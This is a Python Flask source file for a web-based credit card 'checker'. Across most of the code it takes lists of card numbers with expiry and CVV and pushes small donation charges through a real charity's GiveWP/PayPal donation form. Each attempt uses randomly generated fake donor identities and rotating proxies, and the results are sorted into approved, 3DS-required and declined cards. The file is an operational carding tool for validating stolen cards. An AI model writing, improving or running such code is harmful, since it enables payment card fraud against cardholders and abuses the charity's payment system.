from flask import Flask, render_template, request, jsonify, session
import requests
import re
import time
import random
import threading
import queue
from datetime import datetime
import json

app = Flask(__name__)
app.secret_key = 'admin0000'

# Listas de nomes
nomes = ["Liam", "Noah", "Oliver", "Elijah", "James", "William", "Benjamin", "Lucas", "Henry", 
         "Alexander", "Michael", "Daniel", "Matthew", "Joseph", "David", "Samuel", "John", "Ethan",
         "Jacob", "Logan", "Jackson", "Sebastian", "Jack", "Aiden", "Owen", "Leo", "Wyatt", "Jayden",
         "Gabriel", "Carter", "Luke", "Grayson", "Isaac", "Lincoln", "Mason", "Theodore", "Ryan",
         "Nathan", "Andrew", "Joshua", "Thomas", "Charles", "Caleb", "Christian", "Hunter", "Jonathan"]

apelidos = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez",
            "Wilson", "Martinez", "Anderson", "Taylor", "Thomas", "Hernandez", "Moore", "Martin", "Thompson",
            "White", "Lee", "Perez", "Harris", "Clark", "Lewis", "Robinson", "Walker", "Young", "Allen"]

# Configuração
max_threads = 10
proxies_list = []
current_proxy_index = 0
proxy_lock = threading.Lock()
request_counter = 0
request_lock = threading.Lock()

def parse_proxy(proxy_string):
    """Parse diferentes formatos de proxy HTTP"""
    proxy_string = proxy_string.strip()
    
    if proxy_string.startswith('http://'):
        return proxy_string
    
    if '@' in proxy_string and ':' in proxy_string.split('@')[0]:
        return f'http://{proxy_string}'
    
    if ':' in proxy_string and not '@' in proxy_string:
        parts = proxy_string.split(':')
        if len(parts) == 2:
            return f'http://{proxy_string}'
    
    if proxy_string.startswith('http://') and '@' not in proxy_string:
        return proxy_string
    
    return None

def test_proxy(proxy_url):
    """Testa se um proxy está funcionando"""
    try:
        proxies = {'http': proxy_url, 'https': proxy_url}
        response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
        return response.status_code == 200
    except:
        return False

def get_next_proxy():
    """Retorna o próximo proxy da lista de forma round-robin a cada 5 requisições"""
    global current_proxy_index, request_counter
    
    with proxy_lock:
        if not proxies_list:
            return None
        
        with request_lock:
            request_counter += 1
            if request_counter >= 5:
                request_counter = 0
                current_proxy_index = (current_proxy_index + 1) % len(proxies_list)
        
        proxy = proxies_list[current_proxy_index]
        return {'http': proxy, 'https': proxy}

def get_session_with_proxy():
    """Cria uma sessão com proxy configurado"""
    session = requests.Session()
    proxy = get_next_proxy()
    if proxy:
        session.proxies.update(proxy)
    return session

def get_bin_info(bin_number):
    try:
        session = get_session_with_proxy()
        data = session.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=3).json()
        return data
    except:
        return {}

def format_year(yy):
    yy = str(yy).strip()
    if len(yy) == 2:
        return f"20{yy}"
    elif len(yy) == 4:
        return yy
    return yy

def check_card(card_details):
    """Função principal de verificação de cartão"""
    card_details = card_details.strip()
    parts = card_details.split("|")
    
    if len(parts) != 4:
        return {
            'status': 'DECLINED ❌',
            'response': 'Invalid format',
            'card': card_details,
            'message': 'Invalid card format'
        }
    
    cc = parts[0]
    mm = parts[1]
    yy_raw = parts[2]
    cvv = parts[3]
    yy = format_year(yy_raw)
    
    session = get_session_with_proxy()
    
    codigos_postais_ny_manhattan = [
        '10001', '10002', '10003', '10004', '10005', '10006', '10007', '10009', '10010',
        '10011', '10012', '10013', '10014', '10016', '10017', '10018', '10019', '10021'
    ]
    
    try:
        nome = random.choice(nomes)
        apelido = random.choice(apelidos)
        postal = random.choice(codigos_postais_ny_manhattan)
        numero = f"201{random.randint(0, 9999999):07d}"
        email = f"{nome.lower()}{apelido.lower()}{random.randint(10,999)}@gmail.com"
        
        headers = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        }
        
        response = session.get('https://solefamily.org/donate/', cookies=session.cookies, headers=headers)
        
        params = {'giveDonationFormInIframe': '1'}
        res = session.get('https://solefamily.org/give/23178', params=params, cookies=session.cookies, headers=headers).text
        
        hash_match = re.search('form-hash" value="(.*?)"', res)
        if not hash_match:
            return {
                'status': 'DECLINED ❌',
                'response': 'Hash extraction failed',
                'card': card_details,
                'message': 'Could not extract form hash'
            }
        hash1 = hash_match.group(1)
        
        files = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, '23178-1'),
            'give-form-id': (None, '23178'),
            'give-form-title': (None, 'Donation Form'),
            'give-current-url': (None, 'https://solefamily.org/donate/'),
            'give-form-url': (None, 'https://solefamily.org/give/23178/'),
            'give-form-minimum': (None, '100'),
            'give-form-maximum': (None, '1000000000'),
            'give-form-hash': (None, hash1),
            'give-price-id': (None, '0'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '10'),
            'give_first': (None, nome),
            'give_last': (None, apelido),
            'give_email': (None, email),
            'payment-mode': (None, 'paypal-commerce'),
            'give_action': (None, 'purchase'),
            'give-gateway': (None, 'paypal-commerce'),
            'give_embed_form': (None, '1'),
            'action': (None, 'give_process_donation'),
            'give_ajax': (None, 'true'),
        }
        
        response = session.post('https://solefamily.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, files=files)
        time.sleep(1)
        
        params = {'action': 'give_paypal_commerce_create_order'}
        response = session.post('https://solefamily.org/wp-admin/admin-ajax.php', params=params, cookies=session.cookies, headers=headers, files=files)
        
        response_json = response.json()
        if 'data' not in response_json or 'id' not in response_json['data']:
            return {
                'status': 'DECLINED ❌',
                'response': 'Order creation failed',
                'card': card_details,
                'message': 'Could not create order'
            }
        
        id_value = response_json['data']['id']
        time.sleep(3)
        
        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': id_value,
                'card': {
                    'cardNumber': cc,
                    'type': 'VISA',
                    'expirationDate': f'{mm}/{yy}',
                    'postalCode': postal,
                    'securityCode': cvv,
                },
                'phoneNumber': numero,
                'firstName': nome,
                'lastName': apelido,
                'billingAddress': {
                    'givenName': nome,
                    'familyName': apelido,
                    'state': 'NY',
                    'country': 'US',
                    'line1': '47W 13th street ',
                    'city': 'New York ',
                    'postalCode': postal,
                },
                'shippingAddress': {
                    'givenName': nome,
                    'familyName': apelido,
                    'state': 'NY',
                    'country': 'US',
                    'line1': '47W 13th street ',
                    'city': 'New York ',
                    'postalCode': postal,
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': None,
        }
        
        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data)
        last = response.text
        
        bin_info = get_bin_info(cc[:6])
        
        result = {
            'card': card_details,
            'bin_info': bin_info,
            'time': datetime.now().strftime("%H:%M:%S")
        }
        
        if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            result['status'] = 'APPROVED ✅'
            result['response'] = 'Charged successfully'
            result['message'] = 'CHARGE 2$ ✅|Charged successfully'
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            result['status'] = '3DS REQUIRED ⚠️'
            result['response'] = '3DS Verification Required'
            result['message'] = 'Approve ❎|3DS Required'
        elif 'INVALID_SECURITY_CODE' in last:
            result['status'] = 'APPROVED ✅'
            result['response'] = 'Invalid Security Code'
            result['message'] = 'APPROVED CCN ✅|INVALID_SECURITY_CODE'
        elif 'INVALID_BILLING_ADDRESS' in last:
            result['status'] = 'APPROVED ✅'
            result['response'] = 'Invalid Billing Address'
            result['message'] = 'APPROVED - AVS ✅|INVALID_BILLING_ADDRESS'
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            result['status'] = 'APPROVED ✅'
            result['response'] = 'Account Restricted'
            result['message'] = 'APPROVED ✅|EXISTING_ACCOUNT_RESTRICTED'
        else:
            result['status'] = 'DECLINED ❌'
            result['response'] = 'Transaction Declined'
            result['message'] = f'DECLINED ❌|{response.text[:100] if hasattr(response, "text") else "Unknown error"}'
        
        return result
        
    except Exception as e:
        return {
            'status': 'ERROR ❌',
            'response': str(e),
            'card': card_details,
            'message': f'ERROR ❌|{str(e)}'
        }

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/add_proxies', methods=['POST'])
def api_add_proxies():
    global proxies_list
    data = request.json
    proxy_text = data.get('proxies', '')
    lines = proxy_text.strip().split('\n')
    
    added = 0
    invalid = 0
    
    for line in lines:
        parsed = parse_proxy(line)
        if parsed:
            proxies_list.append(parsed)
            added += 1
        else:
            invalid += 1
    
    return jsonify({
        'success': True,
        'added': added,
        'invalid': invalid,
        'total': len(proxies_list)
    })

@app.route('/api/test_proxies', methods=['POST'])
def api_test_proxies():
    global proxies_list
    
    if not proxies_list:
        return jsonify({'success': False, 'error': 'No proxies to test'})
    
    working_proxies = []
    failed_proxies = []
    
    for proxy in proxies_list:
        if test_proxy(proxy):
            working_proxies.append(proxy)
        else:
            failed_proxies.append(proxy)
    
    proxies_list = working_proxies
    
    return jsonify({
        'success': True,
        'working': len(working_proxies),
        'failed': len(failed_proxies),
        'total': len(working_proxies) + len(failed_proxies)
    })

@app.route('/api/view_proxies', methods=['GET'])
def api_view_proxies():
    return jsonify({
        'total': len(proxies_list),
        'proxies': proxies_list[:20]  # Mostrar apenas os primeiros 20
    })

@app.route('/api/delete_proxies', methods=['POST'])
def api_delete_proxies():
    global proxies_list, current_proxy_index, request_counter
    count = len(proxies_list)
    proxies_list = []
    current_proxy_index = 0
    request_counter = 0
    
    return jsonify({
        'success': True,
        'deleted': count
    })

@app.route('/api/check_single', methods=['POST'])
def api_check_single():
    data = request.json
    card = data.get('card', '')
    
    # Validar formato
    pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
    if not re.match(pattern, card):
        return jsonify({
            'success': False,
            'error': 'Invalid card format. Use: 4111111111111111|12|2026|123'
        })
    
    result = check_card(card)
    return jsonify({
        'success': True,
        'result': result
    })

@app.route('/api/check_mass', methods=['POST'])
def api_check_mass():
    data = request.json
    cards_text = data.get('cards', '')
    threads_count = data.get('threads', max_threads)
    
    pattern = r'\d{16}\|\d{1,2}\|\d{2,4}\|\d{3}'
    cards = re.findall(pattern, cards_text)
    
    if not cards:
        return jsonify({
            'success': False,
            'error': 'No valid cards found'
        })
    
    results = []
    approved = []
    declined = []
    
    # Processar cards (simplificado para exemplo)
    for card in cards:
        result = check_card(card)
        results.append(result)
        if 'APPROVED' in result.get('status', ''):
            approved.append(result)
        else:
            declined.append(result)
    
    return jsonify({
        'success': True,
        'total': len(cards),
        'approved_count': len(approved),
        'declined_count': len(declined),
        'approved': approved,
        'declined': declined,
        'all_results': results
    })

@app.route('/api/get_status', methods=['GET'])
def api_get_status():
    return jsonify({
        'threads': max_threads,
        'proxies_count': len(proxies_list),
        'status': 'Online'
    })

if __name__ == '__main__':
    print("🚀 Checker API Started Successfully!")
    print(f"📍 Visit: http://localhost:5000")
    print(f"⚙️ Threads configured: {max_threads}")
    print(f"🌐 Proxy rotation: Every 5 requests")
    app.run(debug=True, host='0.0.0.0', port=5000)
